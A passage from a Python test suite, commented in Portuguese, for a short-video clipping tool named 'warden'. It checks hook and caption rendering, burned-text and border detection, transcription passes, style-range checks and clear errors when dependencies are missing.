    def test_the_hook_lands_and_stays_inside_the_frame(self):
        out = os.path.join(self.dir, "hook.mp4")
        hook = "ele apostou contra o Djokovic e ganhou 90 mil"
        result = self.M.cut(self.black, out, self.r, start=0, end=3,
                            sound="platform", crop="center", hook=hook)
        self.assertGreater(self._white(out), 2000, "o hook não chegou na imagem")
        # Nenhum pixel branco encosta na borda lateral: é o corte dos dois lados.
        import subprocess
        png = out + ".edge.png"
        subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-ss", "1", "-i",
                        out, "-frames:v", "1", png], check=True, capture_output=True)
        from PIL import Image
        im = Image.open(png).convert("L")
        for x in (0, 1, 2, im.width - 3, im.width - 2, im.width - 1):
            coluna = [im.getpixel((x, y)) for y in range(0, im.height, 4)]
            self.assertLess(max(coluna), 200,
                            f"o hook toca a borda em x={x}: está cortado")
        self.assertTrue(any("hook drawn at" in n for n in result["notes"]))

    def test_a_portuguese_hook_refuses_an_english_caption(self):
        self.S.write_approval(self.srt)
        ingles = os.path.join(self.dir, "en.srt")
        with open(ingles, "w", encoding="utf-8") as fh:
            fh.write(self.M.to_srt([{"start": 0.0, "end": 2.0, "text":
                "I won 90k on polymarket and you know that the thing was"},
                {"start": 2.2, "end": 4.0, "text":
                "he did the voting was the underdog and they would have said"}]))
        self.S.write_approval(ingles)
        out = os.path.join(self.dir, "misturado.mp4")
        result = self.M.cut(self.black, out, self.r, start=0, end=3,
                            sound="platform", crop="center", caption_srt=ingles,
                            hook="ele apostou contra o Djokovic e ganhou muito")
        self.assertTrue(any("not burning captions" in n and "language" not in n.lower()
                            or "reads as en" in n for n in result["notes"]),
                        result["notes"])


# ════════════════════════════════════════════════════════════════════ a imagem
#
# Fase 3. O `cut()` já sabia que não enxergava texto queimado no material -- ele
# avisava e queimava por cima mesmo assim. Aqui ele passa a olhar.

def _frame_with(width, height, *, bottom_text=False, left_bar=0, top_text=False):
    """Um quadro sintético do PIL, com ou sem os defeitos que a detecção procura."""
    from PIL import Image, ImageDraw
    import warden_style as S
    im = Image.new("L", (width, height), 128)
    d = ImageDraw.Draw(im)
    # Miolo com alguma textura, senão a densidade de base é zero e toda razão
    # vira infinito. Esparsa: uma imagem real tem bem menos borda por pixel que
    # uma faixa de letras, e é essa diferença que a detecção mede.
    for i in range(0, width, 90):
        d.line([(i, int(height * 0.25)), (i + 30, int(height * 0.75))],
               fill=190, width=4)
    if left_bar:
        d.rectangle([0, 0, left_bar - 1, height], fill=0)
    font = S._font(max(14, height // 22))
    if bottom_text:
        for k in range(2):
            d.text((20, height - int(height * 0.11) + k * int(height * 0.05)),
                   "AVISO LEGAL NAO DISPONIVEL EM TODAS AS JURISDICOES",
                   font=font, fill=255)
    if top_text:
        d.text((20, int(height * 0.02)), "MANCHETE QUEIMADA NO MATERIAL",
               font=font, fill=255)
    return im


class SeesTheFootage(unittest.TestCase):
    """A detecção de texto queimado e de moldura, sobre quadros construídos."""

    def setUp(self):
        _pillow_or_skip()
        import warden_style
        self.S = warden_style
        if not self.S.font_available():
            raise unittest.SkipTest("a fonte do repo não está no lugar")

    def test_burned_bottom_text_is_found(self):
        frames = [_frame_with(960, 540, bottom_text=True) for _ in range(6)]
        got = self.S.burned_text_bands(frames)
        self.assertTrue(got["bottom"], got["evidence"])
        self.assertFalse(got["top"], got["evidence"])

    def test_clean_footage_is_not_accused(self):
        """Um falso positivo cobre imagem limpa com um degradê preto por nada."""
        frames = [_frame_with(960, 540) for _ in range(6)]
        got = self.S.burned_text_bands(frames)
        self.assertFalse(got["bottom"], got["evidence"])
        self.assertFalse(got["top"], got["evidence"])

    def test_burned_top_text_is_found_too(self):
        frames = [_frame_with(960, 540, top_text=True) for _ in range(6)]
        self.assertTrue(self.S.burned_text_bands(frames)["top"])

    def test_text_in_a_single_frame_is_not_a_burned_band(self):
        """Uma mão que passa não é um rodapé. A decisão pede persistência."""
        frames = ([_frame_with(960, 540) for _ in range(5)]
                  + [_frame_with(960, 540, bottom_text=True)])
        self.assertFalse(self.S.burned_text_bands(frames)["bottom"])

    def test_the_bottom_band_never_swallows_the_frame(self):
        """Arte densa lia como texto e a varredura subia até metade da altura --
        o degradê comia um terço do quadro. O teto é o que impede isso."""
        frames = [_frame_with(960, 540, bottom_text=True) for _ in range(6)]
        self.assertLessEqual(self.S.burned_text_bands(frames)["bottom_reach"],
                             self.S.BAND_CAP)

    def test_a_colour_bar_on_the_edge_is_measured_in_pixels(self):
        """A faixa vertical ciano da borda do material entrou no enquadramento e
        ficou parada ali o clipe inteiro."""
        frames = [_frame_with(960, 540, left_bar=15) for _ in range(6)]
        got = self.S.frame_border(frames)
        self.assertGreaterEqual(got["left"], 12)
        self.assertLessEqual(got["left"], 18)
        self.assertEqual(got["right"], 0)

    def test_picture_that_reaches_the_edge_is_not_called_a_border(self):
        frames = [_frame_with(960, 540) for _ in range(6)]
        got = self.S.frame_border(frames)
        self.assertEqual((got["left"], got["right"]), (0, 0))


class Movement(unittest.TestCase):
    """Zero movimento de câmera, zero variação de escala: um trecho bruto de 20s
    com texto por cima. Não é bug, é ausência de recurso."""

    def setUp(self):
        _ffmpeg_or_skip()
        _pillow_or_skip()
        import warden_media
        self.M = warden_media
        self.dir = tempfile.mkdtemp(prefix="warden-mov-")
        self.src = _make_source(os.path.join(self.dir, "src.mp4"), seconds=8)
        self.r = rules(video={"duration_min_s": 1, "duration_max_s": 6,
                              "width": 1080, "height": 1920, "audio": "forbidden"})

    def _scale_changed(self, mp4):
        """A escala mudou? Compara o primeiro e o último quadro: com zoom, o
        conteúdo cresce, então as bordas do quadro mostram coisa diferente."""
        import subprocess
        from PIL import Image, ImageChops
        saidas = []
        for t in ("0.2", "3.6"):
            png = f"{mp4}.{t}.png"
            subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-ss", t, "-i",
                            mp4, "-frames:v", "1", png], check=True,
                           capture_output=True)
            saidas.append(Image.open(png).convert("L").resize((160, 284)))
        dif = ImageChops.difference(*saidas)
        return sum(dif.histogram()[40:]) / (160 * 284)

    def test_a_clip_moves_in_scale_by_default(self):
        out = os.path.join(self.dir, "mov.mp4")
        result = self.M.cut(self.src, out, self.r, start=0, end=4, sound="platform", crop="center")
        self.assertTrue(any("scale moves" in n for n in result["notes"]),
                        result["notes"])
        self.assertGreater(self._scale_changed(out), 0.02,
                           "o clipe não tem nenhuma variação de escala")

    def test_motion_can_be_turned_off_explicitly(self):
        out = os.path.join(self.dir, "parado.mp4")
        result = self.M.cut(self.src, out, self.r, start=0, end=4,
                            sound="platform", crop="center", motion=False)
        self.assertFalse(any("scale moves" in n for n in result["notes"]))


class FootageTreatment(unittest.TestCase):
    """Detectar era metade. Tratar é a outra, e a decisão vai num aviso ao dono."""

    def setUp(self):
        _ffmpeg_or_skip()
        _pillow_or_skip()
        import warden_media, warden_style
        self.M, self.S = warden_media, warden_style
        if not self.S.font_available():
            raise unittest.SkipTest("a fonte do repo não está no lugar")
        self.dir = tempfile.mkdtemp(prefix="warden-trat-")
        # Uma fonte com disclaimer queimado embaixo e barra ciano na borda,
        # como o material que produziu o clipe reprovado.
        from PIL import Image
        quadro = _frame_with(1920, 1080, bottom_text=True, left_bar=16)
        base = os.path.join(self.dir, "quadro.png")
        Image.merge("RGB", (quadro, quadro, quadro)).save(base)
        import subprocess
        self.src = os.path.join(self.dir, "sujo.mp4")
        subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-loop", "1",
                        "-framerate", "30", "-i", base, "-t", "6", "-c:v",
                        "libx264", "-preset", "ultrafast", "-pix_fmt", "yuv420p",
                        self.src], check=True, capture_output=True)
        self.srt = os.path.join(self.dir, "c.srt")
        with open(self.srt, "w", encoding="utf-8") as fh:
            fh.write(self.M.to_srt([{"start": 0.0, "end": 2.0,
                                     "text": "uma fala que vai para a tela"}]))
        self.S.write_approval(self.srt)
        self.r = rules(video={"duration_max_s": 5, "width": 1080, "height": 1920,
                              "audio": "forbidden"})

    def test_the_source_border_is_trimmed_before_framing(self):
        out = os.path.join(self.dir, "semborda.mp4")
        result = self.M.cut(self.src, out, self.r, start=0, end=3, sound="platform", crop="center")
        self.assertTrue(any("source furniture" in n for n in result["notes"]),
                        result["notes"])

    def test_burning_over_source_text_covers_it_and_says_so(self):
        out = os.path.join(self.dir, "coberto.mp4")
        result = self.M.cut(self.src, out, self.r, start=0, end=3,
                            sound="platform", crop="center", caption_srt=self.srt)
        self.assertTrue(any("already carries burned text" in n
                            and "Covered it" in n for n in result["notes"]),
                        result["notes"])
        # E o rodapé do acervo some de verdade no render.
        import subprocess
        png = out + ".png"
        subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-ss", "1", "-i",
                        out, "-frames:v", "1", png], check=True, capture_output=True)
        from PIL import Image
        im = Image.open(png).convert("L")
        faixa = [im.getpixel((x, y)) for x in range(0, 1080, 12)
                 for y in range(1750, 1920, 8)]
        self.assertLess(max(faixa), 90,
                        "o texto do acervo continua visível embaixo da nossa legenda")

    def test_not_covering_is_a_choice_that_warns_instead_of_burning_silently(self):
        out = os.path.join(self.dir, "naocobre.mp4")
        result = self.M.cut(self.src, out, self.r, start=0, end=3,
                            sound="platform", crop="center", caption_srt=self.srt,
                            cover_footer=False)
        self.assertTrue(any("Not covering it" in n for n in result["notes"]),
                        result["notes"])

    def test_clean_footage_gets_no_footer_at_all(self):
        """Cobrir imagem limpa é trocar um defeito por outro."""
        limpa = _make_source(os.path.join(self.dir, "limpa.mp4"), seconds=5)
        out = os.path.join(self.dir, "semrodape.mp4")
        result = self.M.cut(limpa, out, self.r, start=0, end=3,
                            sound="platform", crop="center", caption_srt=self.srt)
        self.assertFalse(any("Covered it" in n for n in result["notes"]),
                         result["notes"])


# ════════════════════════════════════════════════════════════════════ velocidade
#
# Fase 4. Dois cortes de 20s de uma fonte de 23 minutos levaram mais de 15
# minutos, e a legenda saiu na língua errada.

class PublishedSubtitles(unittest.TestCase):
    """`archive` baixa com `--sub-langs pt,pt-BR,en`, então os dois arquivos
    ficam lado a lado. A busca pegava o primeiro em ordem alfabética."""

    def setUp(self):
        import warden_media
        self.M = warden_media
        self.dir = tempfile.mkdtemp(prefix="warden-subs-")
        self.video = os.path.join(self.dir, "source-abc123.mp4")
        open(self.video, "wb").write(b"x")

    def _write(self, suffix, text="uma fala"):
        p = os.path.join(self.dir, f"source-abc123{suffix}")
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(f"1\n00:00:00,000 --> 00:00:02,000\n{text}\n")
        return p

    def test_portuguese_wins_over_english_when_both_are_there(self):
        """`.en` vem antes de `.pt` no alfabeto, e era assim que o inglês
        ganhava sempre -- a explicação mais provável da legenda em inglês
        queimada num clipe cujo hook estava em português."""
        self._write(".en.srt", "I won 90k")
        pt = self._write(".pt.srt", "eu ganhei noventa mil")
        got, lang = self.M._subtitle_beside(self.video)
        self.assertEqual(got, pt)
        self.assertEqual(lang, "pt")

    def test_pt_br_is_preferred_over_plain_pt(self):
        self._write(".pt.srt")
        br = self._write(".pt-BR.srt")
        got, lang = self.M._subtitle_beside(self.video)
        self.assertEqual(got, br)

    def test_an_explicit_preference_wins(self):
        en = self._write(".en.srt")
        self._write(".pt.srt")
        got, lang = self.M._subtitle_beside(self.video, prefer=["en"])
        self.assertEqual(got, en)
        self.assertEqual(lang, "en")

    def test_english_alone_is_still_used(self):
        """Preferir português não é recusar inglês: uma fonte em inglês tem
        legenda em inglês, e ela é a melhor que existe."""
        en = self._write(".en.srt")
        got, lang = self.M._subtitle_beside(self.video)
        self.assertEqual(got, en)

    def test_no_subtitle_beside_is_not_an_error(self):
        got, lang = self.M._subtitle_beside(self.video)
        self.assertIsNone(got)

    def test_a_subtitle_with_no_language_tag_still_counts(self):
        plain = self._write(".srt")
        got, lang = self.M._subtitle_beside(self.video)
        self.assertEqual(got, plain)
        self.assertIsNone(lang)


class TwoPassTranscription(unittest.TestCase):
    """23 minutos de áudio para aproveitar 40 segundos, com o modelo bom."""

    def setUp(self):
        import warden_media
        self.M = warden_media

    def test_the_scan_pass_asks_for_the_cheap_model(self):
        import io
        from contextlib import redirect_stdout, redirect_stderr
        chamou = {}

        def falso(path, model_size=None, window=None, prefer_lang=None,
                  progress=None):
            chamou.update(model_size=model_size, window=window)
            return {"source": "fake", "segments": [], "path": None}
        real = self.M.transcribe
        self.M.transcribe = falso
        try:
            alvo = os.path.join(warden.state_dir(), "scan.transcript.json")
            fonte = os.path.join(warden.state_dir(), "fonte.mp4")
            open(fonte, "wb").write(b"x")
            with redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()):
                warden.main(["transcribe", fonte, "--out", alvo, "--scan"])
        finally:
            self.M.transcribe = real
        self.assertEqual(chamou["model_size"], "tiny")
        self.assertIsNone(chamou["window"])

    def test_the_scan_pass_writes_no_srt_to_burn(self):
        """`tiny` erra palavra. Um arquivo que se parece com legenda é um
        arquivo que alguém queima."""
        import io
        from contextlib import redirect_stdout, redirect_stderr

        def falso(path, model_size=None, window=None, prefer_lang=None,
                  progress=None):
            return {"source": "fake tiny", "path": None,
                    "segments": [{"start": 0.0, "end": 2.0, "text": "jokovic"}]}
        real = self.M.transcribe
        self.M.transcribe = falso
        try:
            alvo = os.path.join(warden.state_dir(), "scan2.transcript.json")
            fonte = os.path.join(warden.state_dir(), "fonte2.mp4")
            open(fonte, "wb").write(b"x")
            with redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()):
                warden.main(["transcribe", fonte, "--out", alvo, "--scan"])
        finally:
            self.M.transcribe = real
        self.assertFalse(os.path.exists(alvo.replace(".transcript", "")[:-5] + ".srt"))

    def test_a_window_asks_for_the_good_model_and_only_that_slice(self):
        import io
        from contextlib import redirect_stdout, redirect_stderr
        chamou = {}

        def falso(path, model_size=None, window=None, prefer_lang=None,
                  progress=None):
            chamou.update(model_size=model_size, window=window)
            return {"source": "fake", "segments": [], "path": None}
        real = self.M.transcribe
        self.M.transcribe = falso
        try:
            alvo = os.path.join(warden.state_dir(), "win.transcript.json")
            fonte = os.path.join(warden.state_dir(), "fonte3.mp4")
            open(fonte, "wb").write(b"x")
            with redirect_stdout(io.StringIO()), redirect_stderr(io.StringIO()):
                warden.main(["transcribe", fonte, "--out", alvo,
                             "--window", "312-332"])
        finally:
            self.M.transcribe = real
        self.assertEqual(chamou["window"], (312.0, 332.0))
        self.assertIsNone(chamou["model_size"])

    def test_a_window_transcript_comes_back_on_the_sources_clock(self):
        """As janelas voltam no relógio da FONTE, senão o `cut` desloca de novo
        e a legenda aparece no plano errado."""
        _ffmpeg_or_skip()
        try:
            import faster_whisper  # noqa: F401
        except ImportError:
            raise unittest.SkipTest("faster-whisper não está instalado")
        d = tempfile.mkdtemp(prefix="warden-win-")
        src = _make_source(os.path.join(d, "s.mp4"), seconds=20)
        got = self.M.transcribe(src, window=(10.0, 14.0), progress=lambda _l: None)
        self.assertEqual(got["window"], [10.0, 14.0])
        for seg in got["segments"]:
            self.assertGreaterEqual(seg["start"], 9.0, seg)

    def test_progress_is_reported_rather_than_ten_minutes_of_silence(self):
        """Dez minutos de silêncio num chat lê como agente morto."""
        _ffmpeg_or_skip()
        try:
            import faster_whisper  # noqa: F401
        except ImportError:
            raise unittest.SkipTest("faster-whisper não está instalado")
        d = tempfile.mkdtemp(prefix="warden-prog-")
        src = _make_source(os.path.join(d, "s.mp4"), seconds=5)
        linhas = []
        self.M.transcribe(src, model_size="tiny", progress=linhas.append)
        self.assertTrue(any("transcribing" in l for l in linhas), linhas)
        self.assertTrue(any("done" in l for l in linhas), linhas)


# ════════════════════════════════════════════════════════════════ padrão medido
#
# Fase 5. "Ficou feio" vira erro que o agente vê sozinho.

class StyleSpec(unittest.TestCase):
    """As faixas do corpus, e o que elas podem e não podem reprovar."""

    def setUp(self):
        import warden_style
        self.S = warden_style

    def test_consolidate_gives_ranges_and_not_single_values(self):
        """Um aprovado tem 62s e outro tem 19s, e nenhum dos dois é o certo."""
        spec = self.S.consolidate([
            {"duration_s": 13.0, "scale_variation": 0.2},
            {"duration_s": 73.0, "scale_variation": 0.8},
            {"duration_s": 25.0, "scale_variation": 0.5}])
        self.assertEqual(spec["duration_s"]["min"], 13.0)
        self.assertEqual(spec["duration_s"]["max"], 73.0)
        self.assertEqual(spec["duration_s"]["n"], 3)

    def test_the_shipped_spec_was_measured_from_the_real_corpus(self):
        path = warden.specs_path()
        self.assertTrue(os.path.isfile(path), f"falta {path}")
        with open(path, encoding="utf-8") as fh:
            spec = json.load(fh)
        self.assertGreaterEqual(len(spec["measured_from"]), 15,
                                "um corpus pequeno demais não é uma faixa")
        faixas = spec["ranges"]
        # O que o corpus diz com uma voz só: todo aprovado é 1080x1920 a 30fps.
        self.assertEqual(faixas["width"]["min"], faixas["width"]["max"])
        self.assertEqual(faixas["width"]["min"], 1080)
        self.assertEqual(faixas["height"]["min"], 1920)
        self.assertEqual(faixas["fps"]["min"], 30.0)
        # E que todo aprovado se mexe. É a faixa que sustenta o limite de escala.
        self.assertGreater(faixas["scale_variation"]["min"], 0.05)

    def test_a_clip_with_no_movement_is_rejected(self):
        achados = self.S.check_against(
            {"scale_variation": 0.0},
            {"scale_variation": {"min": 0.12, "max": 0.83}})
        self.assertTrue(any(lv == "REJECT" and "trecho bruto" in m
                            for lv, m in achados), achados)

    def test_a_clip_that_moves_is_not_rejected(self):
        achados = self.S.check_against(
            {"scale_variation": 0.5},
            {"scale_variation": {"min": 0.12, "max": 0.83}})
        self.assertFalse([m for lv, m in achados if lv == "REJECT"], achados)

    def test_the_unreliable_metrics_do_not_get_a_vote(self):
        """text_width_ratio medido em pixels deu 1,14 num aprovado cujo texto
        está claramente dentro do quadro. Uma métrica que reprovaria um clipe
        que o dono aprovou não pode reprovar nada."""
        achados = self.S.check_against(
            {"text_width_ratio": 1.14, "text_rows": 3.0,
             "caption_lines_max": 4, "scale_variation": 0.5},
            {"scale_variation": {"min": 0.12, "max": 0.83}})
        self.assertFalse([m for lv, m in achados if lv == "REJECT"], achados)
        self.assertIn("text_width_ratio", " ".join(m for _lv, m in achados))


class StyleSidecar(unittest.TestCase):
    """O que reprova de verdade: os números que o renderizador mediu, não os que
    alguém tentou recuperar dos pixels depois."""

    def setUp(self):
        import warden_style
        self.S = warden_style

    def test_a_hook_wider_than_the_usable_width_is_rejected(self):
        achados = self.S.check_sidecar(
            {"hook": {"width_px": 1100, "usable_px": 854, "lines": 1,
                      "complete": True}})
        self.assertTrue(any(lv == "REJECT" and "cropped" in m
                            for lv, m in achados), achados)

    def test_a_hook_that_fits_passes(self):
        achados = self.S.check_sidecar(
            {"hook": {"width_px": 840, "usable_px": 854, "lines": 2,
                      "complete": True}})
        self.assertFalse([m for lv, m in achados if lv == "REJECT"], achados)

    def test_a_truncated_hook_is_rejected_and_says_words_were_dropped(self):
        """Entregar um hook ao qual faltam palavras, sem dizer, é pior que
        entregá-lo cortado: cortado se vê no contact sheet, faltando não."""
        achados = self.S.check_sidecar(
            {"hook": {"width_px": 853, "usable_px": 854, "lines": 2,
                      "size_px": 34, "chars": 159, "complete": False}})
        self.assertTrue(any(lv == "REJECT" and "words were dropped" in m
                            for lv, m in achados), achados)

    def test_a_cue_over_two_and_a_half_seconds_is_rejected(self):
        achados = self.S.check_sidecar(
            {"caption": {"cues": 3, "max_lines": 2, "max_cue_s": 7.0}})
        self.assertTrue(any(lv == "REJECT" and "2,5s" in m
                            for lv, m in achados), achados)

    def test_a_three_line_cue_is_rejected(self):
        achados = self.S.check_sidecar(
            {"caption": {"cues": 3, "max_lines": 6, "max_cue_s": 2.0}})
        self.assertTrue(any(lv == "REJECT" and "6 lines" in m
                            for lv, m in achados), achados)

    def test_our_caption_over_the_archives_uncovered_caption_is_rejected(self):
        achados = self.S.check_sidecar(
            {"caption": {"cues": 8, "max_lines": 2, "max_cue_s": 2.0},
             "source_text": {"bottom": True}, "footer_covered": False})
        self.assertTrue(any(lv == "REJECT" and "two captions" in m
                            for lv, m in achados), achados)

    def test_clean_footage_with_our_caption_is_not_called_two_captions(self):
        """O material sem texto queimado não tem sobre o que empilhar. Contar
        camadas sem perguntar isso reprovou dois clipes corretos."""
        achados = self.S.check_sidecar(
            {"caption": {"cues": 13, "max_lines": 2, "max_cue_s": 2.2},
             "hook": {"width_px": 849, "usable_px": 854, "lines": 2,
                      "complete": True},
             "source_text": {"bottom": False}, "footer_covered": False})
        self.assertFalse([m for lv, m in achados if lv == "REJECT"], achados)


class DefinitionOfDone(unittest.TestCase):
    """O golden test: a mesma fonte, a mesma janela, o mesmo hook, e cada linha
    da definição de pronto conferida no arquivo que saiu. Mexer no renderizador
    e piorar o padrão quebra isto."""

    def setUp(self):
        _ffmpeg_or_skip()
        _pillow_or_skip()
        import warden_media, warden_style
        self.M, self.S = warden_media, warden_style
        if not self.S.font_available():
            raise unittest.SkipTest("a fonte do repo não está no lugar")
        self.dir = tempfile.mkdtemp(prefix="warden-golden-")
        # Fonte com os dois defeitos do material original: barra na borda e
        # texto queimado no rodapé.
        from PIL import Image
        import subprocess
        q = _frame_with(1920, 1080, bottom_text=True, left_bar=16)
        base = os.path.join(self.dir, "q.png")
        Image.merge("RGB", (q, q, q)).save(base)
        self.src = os.path.join(self.dir, "fonte.mp4")
        subprocess.run(["ffmpeg", "-y", "-loglevel", "error", "-loop", "1",
                        "-framerate", "30", "-i", base, "-t", "8", "-c:v",
                        "libx264", "-preset", "ultrafast", "-pix_fmt", "yuv420p",
                        self.src], check=True, capture_output=True)
        self.srt = os.path.join(self.dir, "c.srt")
        with open(self.srt, "w", encoding="utf-8") as fh:
            fh.write(self.M.to_srt([
                {"start": 0.0, "end": 3.5, "text":
                 "essa foi a razao pela qual eu resolvi armar o proprio povo "
                 "para que eles pudessem se defender quando a guerra chegasse"},
                {"start": 3.6, "end": 5.0, "text": "e foi isso que aconteceu"}]))
        self.S.write_approval(self.srt)
        self.hook = "ele apostou contra o Djokovic e ganhou 90 mil"
        self.r = rules(video={"duration_min_s": 3, "duration_max_s": 6,
                              "width": 1080, "height": 1920, "audio": "forbidden"},
                       caption={"required_hashtags": [], "required_mentions": [],
                                "banned_terms": []})
        self.out = os.path.join(self.dir, "golden.mp4")
        self.result = self.M.cut(self.src, self.out, self.r, start=0, end=5,
                                 sound="platform", crop="center", caption_srt=self.srt,
                                 hook=self.hook)
        self.style = self.result["style"]

    def test_the_hook_fits_whole_in_at_most_two_lines(self):
        hook = self.style["hook"]
        self.assertTrue(hook["complete"], "faltaram palavras no hook")
        self.assertLessEqual(hook["lines"], 2)
        self.assertLessEqual(hook["width_px"], hook["usable_px"])

    def test_no_cue_is_over_two_lines_or_two_and_a_half_seconds(self):
        cap = self.style["caption"]
        self.assertLessEqual(cap["max_lines"], 2)
        self.assertLessEqual(cap["max_cue_s"], 2.5)

    def test_there_are_not_two_captions_in_one_frame(self):
        """A fonte tem texto queimado embaixo; ou ele foi coberto, ou a nossa
        legenda não entrou."""
        self.assertTrue(self.style["source_text"]["bottom"],
                        "o fixture deveria ter texto queimado embaixo")
        self.assertTrue(self.style["footer_covered"],
                        "queimou legenda por cima da legenda do acervo")

    def test_no_source_border_survives_into_the_frame(self):
        self.assertTrue(any("source furniture" in n for n in self.result["notes"]),
                        self.result["notes"])

    def test_there_is_scale_movement(self):
        self.assertTrue(self.style["motion"])
        medida = self.S.measure(self.out, samples=6)
        self.assertGreater(medida["scale_variation"], 0.0)

    def test_the_file_matches_the_campaigns_resolution(self):
        media = warden.probe(self.out)
        self.assertEqual((media["width"], media["height"]), (1080, 1920))

    def test_the_contact_sheet_exists(self):
        self.assertTrue(self.result["sheet"])
        self.assertTrue(os.path.isfile(self.result["sheet"]))

    def test_nothing_in_the_definition_of_done_is_breached(self):
        """A linha única que resume as outras: o render não reclama de si."""
        self.assertEqual(self.result["style_breaches"], [])

    def test_the_render_writes_down_what_it_did(self):
        self.assertTrue(os.path.isfile(self.result["style_path"]))
        with open(self.result["style_path"], encoding="utf-8") as fh:
            gravado = json.load(fh)
        self.assertEqual(gravado["hook"]["lines"], self.style["hook"]["lines"])


# ══════════════════════════════════════════════════ dependência que falta
#
# Bloco A. A forma de defeito é uma só: falta uma dependência, o código segue
# com um resultado pior e ninguém é avisado. Cada caso aqui já custou alguma
# coisa, e o primeiro custou um clipe com o rosto na borda do quadro.

class MissingDependencySpeaks(unittest.TestCase):
    """Sem detector de rosto o corte para; nunca cai no centro calado."""

    def setUp(self):
        _ffmpeg_or_skip()
        _pillow_or_skip()
        import warden_media
        self.M = warden_media
        self.dir = tempfile.mkdtemp(prefix="warden-dep-")
        self.src = _make_source(os.path.join(self.dir, "s.mp4"), w=1920, h=1080)
        self.r = rules(video={"duration_max_s": 5, "width": 1080, "height": 1920,
                              "audio": "forbidden"})

    def _sem_detector(self):
        """Finge a máquina de um host que não tem OpenCV."""
        real = self.M.face_detection_status
        self.M.face_detection_status = lambda: (False, "OpenCV is not installed")
        self.addCleanup(lambda: setattr(self.M, "face_detection_status", real))

    def test_a_landscape_cut_with_no_crop_stops_instead_of_centring(self):
        self._sem_detector()
        with self.assertRaises(RuntimeError) as erro:
            self.M.cut(self.src, os.path.join(self.dir, "a.mp4"), self.r,
                       start=0, end=3, sound="platform")
        mensagem = str(erro.exception)
        self.assertIn("no face detection", mensagem)
        self.assertIn("--crop", mensagem, "o erro tem de dizer o que fazer")

    def test_a_named_side_is_honoured_without_a_detector(self):
        """A mensagem manda passar --crop, então --crop tem de funcionar. Um
        portão que recusa a própria saída que oferece é uma mentira."""
        self._sem_detector()
        r = self.M.cut(self.src, os.path.join(self.dir, "b.mp4"), self.r,
                       start=0, end=3, sound="platform", crop="center")
        self.assertTrue(os.path.isfile(r["out"]))
        self.assertTrue(any("no face detector on this machine" in n
                            for n in r["notes"]), r["notes"])

    def test_an_exact_percentage_is_honoured_without_a_detector(self):
        self._sem_detector()
        r = self.M.cut(self.src, os.path.join(self.dir, "c.mp4"), self.r,
                       start=0, end=3, sound="platform", crop="25")
        self.assertTrue(os.path.isfile(r["out"]))

    def test_a_portrait_source_needs_no_detector_at_all(self):
        """Nada a escolher: a fonte já tem a forma do quadro."""
        self._sem_detector()
        vertical = _make_source(os.path.join(self.dir, "v.mp4"), w=1080, h=1920)
        r = self.M.cut(vertical, os.path.join(self.dir, "d.mp4"), self.r,
                       start=0, end=3, sound="platform")
        self.assertTrue(os.path.isfile(r["out"]))

    def test_status_names_the_detector_when_it_is_missing(self):
        """`warden status` é onde se descobre isso ANTES de cortar."""
        import io
        from contextlib import redirect_stdout
        self._sem_detector()
        saida = io.StringIO()
        with redirect_stdout(saida):
            warden.cmd_status(None)
        texto = saida.getvalue()
        self.assertIn("face detection:", texto)
        self.assertIn("MISSING", texto)


class NothingDegradesQuietly(unittest.TestCase):
    """Os outros sítios da mesma varredura."""

    def setUp(self):
        import warden_media, warden_style
        self.M, self.S = warden_media, warden_style

    def test_a_clip_whose_frames_cannot_be_read_is_not_called_clean(self):
        """Sem quadros, `bottom: False` lia como 'material limpo'. É uma
        resposta que a ferramenta não tem, com a cara de uma que ela tem."""
        _ffmpeg_or_skip()
        _pillow_or_skip()
        d = tempfile.mkdtemp(prefix="warden-cego-")
        src = _make_source(os.path.join(d, "s.mp4"), seconds=4, w=1080, h=1920)
        r = rules(video={"duration_max_s": 5, "width": 1080, "height": 1920,
                         "audio": "forbidden"})
        # Uma janela inteiramente fora do arquivo: nenhum quadro sai de lá.
        with self.assertRaises(RuntimeError) as erro:
            self.M.cut(src, os.path.join(d, "fora.mp4"), r,
                       start=900, end=903, sound="platform", crop="center")
        self.assertIn("could not open any frame", str(erro.exception))

    def test_style_check_refuses_to_pass_on_zero_measurements(self):
        """'dentro da faixa em tudo' sobre nenhuma evidência é o defeito que
        este comando existe para não ter."""
        achados = self.S.check_against({"measured": False}, {})
        self.assertTrue(any(lv == "REJECT" for lv, _m in achados), achados)
        self.assertIn("nothing was measured",
                      " ".join(m for _lv, m in achados))

    def test_the_signals_list_says_when_the_loud_signal_is_absent(self):
        """Um envelope vazio por falta de ffmpeg e um vídeo mudo são a mesma
        lista e não são a mesma coisa."""
        segs = [{"start": 0.0, "end": 2.0, "text": "sera que da certo?"}]
        _rows, why = self.M.analyze_signals(segs)          # sem fonte
        self.assertTrue(why, "silenciou sobre a ausência do sinal de som")
        self.assertIn("only the words", why)

    def test_the_beat_grid_says_what_is_missing_not_the_module_name(self):
        import warden_beat
        real = warden_beat._numpy
        warden_beat._numpy = lambda: (_ for _ in ()).throw(
            RuntimeError("numpy is not installed, and finding the tempo is "
                         "arithmetic over the waveform."))
        try:
            with self.assertRaises(RuntimeError) as erro:
                warden_beat.analyse("/tmp/nao-existe.wav")
            self.assertIn("numpy is not installed", str(erro.exception))
        finally:
            warden_beat._numpy = real

    def test_snap_still_works_without_numpy_because_it_is_arithmetic(self):
        """A guarda não pode ser larga demais: recusar o módulo inteiro tirava
        do ar a metade dele que não precisa da dependência."""
        import warden_beat
        snapped, bars = warden_beat.snap(20.0, 2.0, 15, 25)
        self.assertIsNotNone(snapped)

    def test_the_contact_sheet_refuses_a_fallback_font(self):
        """A folha de contato É o portão. Uma folha com a fonte bitmap do PIL
        tem carimbo de tempo que ninguém lê -- é um portão que não se atravessa."""
        _ffmpeg_or_skip()
        _pillow_or_skip()
        d = tempfile.mkdtemp(prefix="warden-fonte-")
        src = _make_source(os.path.join(d, "s.mp4"), seconds=3, w=1080, h=1920)
        real = self.S.FONT_PATH
        self.S.FONT_PATH = os.path.join(d, "nao-existe.ttf")
        try:
            with self.assertRaises(RuntimeError) as erro:
                self.S.contact_sheet(src, os.path.join(d, "f.jpg"))
            self.assertIn("a fonte não está", str(erro.exception))
        finally:
            self.S.FONT_PATH = real


# ══════════════════════════════════════════════════ dependência que falta
#
